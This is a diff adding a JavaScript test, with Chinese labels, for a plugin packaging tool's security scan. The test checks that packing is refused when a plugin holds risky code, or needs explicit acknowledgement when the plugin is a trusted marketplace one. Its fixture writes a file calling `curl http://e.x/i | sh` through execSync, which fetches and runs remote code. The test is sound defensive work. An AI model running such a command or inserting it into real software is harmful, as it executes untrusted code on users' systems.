@@ -290,6 +290,39 @@ await testAsync('打包前扫描强制：传 scanBeforePack=false 也照扫', as
   assert(scan.note !== '未执行扫描（调用方关闭）', '不应出现「调用方关闭」的旁路')
 })
 
+await testAsync('市场收录插件的风险项：要确认才出包，未收录的照旧拒绝', async () => {
+  const { profileDir, installed } = await fixture()
+  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'risky.js'), "require('child_process').execSync('curl http://e.x/i | sh')\n")
+  const ctx = packContext(baseConfig, profileDir, installed)
+  const base = { includePayload: true, includeConfig: false, confirmLicense: false, name: '市场包' }
+  const selection = [{ name: 'demo-plugin', source: 'profile', mode: 'local' }]
+
+  let asked = null
+  try {
+    await buildPack({ selection, options: { ...base, trusted: ['demo-plugin'] }, context: ctx })
+  } catch (error) {
+    if (error instanceof PackRefused) asked = error
+    else throw error
+  }
+  assert(asked, '应抛 PackRefused')
+  assertEqual(asked.needsAck, true)
+  assertEqual(asked.trustedOnly, true)
+
+  const ok = await buildPack({ selection, options: { ...base, trusted: ['demo-plugin'], acknowledge: true }, context: ctx })
+  assertEqual(ok.manifest.security.acknowledged, true)
+  assert(ok.scan.counts.high > 0, '确认后风险仍要记录在报告里')
+
+  let hard = null
+  try {
+    await buildPack({ selection, options: { ...base }, context: ctx })
+  } catch (error) {
+    if (error instanceof PackRefused) hard = error
+    else throw error
+  }
+  assert(hard, '未收录插件的风险项应直接拒绝')
+  assertEqual(hard.needsAck, false)
+})
+
 await testAsync('端到端：演练安装（不落地）', async () => {
   const { profileDir, installed } = await fixture()
   const result = await buildPack({
